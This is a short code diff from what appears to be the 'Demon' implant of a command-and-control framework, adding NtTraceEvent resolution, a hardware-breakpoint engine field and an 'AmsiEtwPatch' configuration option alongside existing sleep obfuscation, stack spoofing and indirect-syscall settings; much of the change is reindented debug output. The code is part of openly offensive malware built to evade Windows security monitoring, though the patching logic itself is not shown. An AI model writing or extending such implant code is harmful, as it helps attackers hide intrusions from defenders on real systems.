@@ -353,6 +353,7 @@ VOID DemonInit( PVOID ModuleInst )
         Instance.Win32.NtQueryInformationToken           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTOKEN );
         Instance.Win32.NtQueryInformationThread          = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
         Instance.Win32.NtQueryObject                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
+        Instance.Win32.NtTraceEvent                      = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTRACEEVENT );
     } else {
         PUTS( "Failed to load ntdll from PEB" )
         return;
@@ -498,6 +499,7 @@ VOID DemonInit( PVOID ModuleInst )
     Instance.Jobs               = NULL;
     Instance.Downloads          = NULL;
     Instance.Sockets            = NULL;
+    Instance.HwBpEngine         = NULL;
 
     /* Global Objects */
     Instance.Dotnet = NULL;
@@ -553,11 +555,11 @@ VOID DemonConfig()
     Instance.Config.Memory.Execute = ParserGetInt32( &Parser );
 
     PRINTF(
-            "[CONFIG] Memory: \n"
-            " - Allocate: %d  \n"
-            " - Execute : %d  \n",
-            Instance.Config.Memory.Alloc,
-            Instance.Config.Memory.Execute
+        "[CONFIG] Memory: \n"
+        " - Allocate: %d  \n"
+        " - Execute : %d  \n",
+        Instance.Config.Memory.Alloc,
+        Instance.Config.Memory.Execute
     )
 
     Buffer = ParserGetBytes( &Parser, &Length );
@@ -569,29 +571,32 @@ VOID DemonConfig()
     MemCopy( Instance.Config.Process.Spawn86, Buffer, Length );
 
     PRINTF(
-            "[CONFIG] Spawn: \n"
-            " - [x64] => %ls  \n"
-            " - [x86] => %ls  \n",
-            Instance.Config.Process.Spawn64,
-            Instance.Config.Process.Spawn86
+        "[CONFIG] Spawn: \n"
+        " - [x64] => %ls  \n"
+        " - [x86] => %ls  \n",
+        Instance.Config.Process.Spawn64,
+        Instance.Config.Process.Spawn86
     )
 
     Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
     Instance.Config.Implant.StackSpoof         = ParserGetInt32( &Parser );
     Instance.Config.Implant.ProxyLoading       = ParserGetInt32( &Parser );
     Instance.Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
+    Instance.Config.Implant.AmsiEtwPatch       = ParserGetInt32( &Parser );
     Instance.Config.Implant.DownloadChunkSize  = 512000; /* 512k by default. */
 
     PRINTF(
-            "[CONFIG] Sleep Obfuscation: \n"
-            " - Technique: %d \n"
-            " - Stack Dup: %s \n"
-            "[CONFIG] ProxyLoading: %d\n"
-            "[CONFIG] SysIndirect : %s\n",
-            Instance.Config.Implant.SleepMaskTechnique,
-            Instance.Config.Implant.StackSpoof ? "TRUE" : "FALSE",
-            Instance.Config.Implant.ProxyLoading,
-            Instance.Config.Implant.SysIndirect ? "TRUE" : "FALSE"
+        "[CONFIG] Sleep Obfuscation: \n"
+        " - Technique: %d \n"
+        " - Stack Dup: %s \n"
+        "[CONFIG] ProxyLoading: %d\n"
+        "[CONFIG] SysIndirect : %s\n"
+        "[CONFIG] AmsiEtwPatch: %d\n",
+        Instance.Config.Implant.SleepMaskTechnique,
+        Instance.Config.Implant.StackSpoof ? "TRUE" : "FALSE",
+        Instance.Config.Implant.ProxyLoading,
+        Instance.Config.Implant.SysIndirect ? "TRUE" : "FALSE",
+        Instance.Config.Implant.AmsiEtwPatch
     )
 
 #ifdef TRANSPORT_HTTP
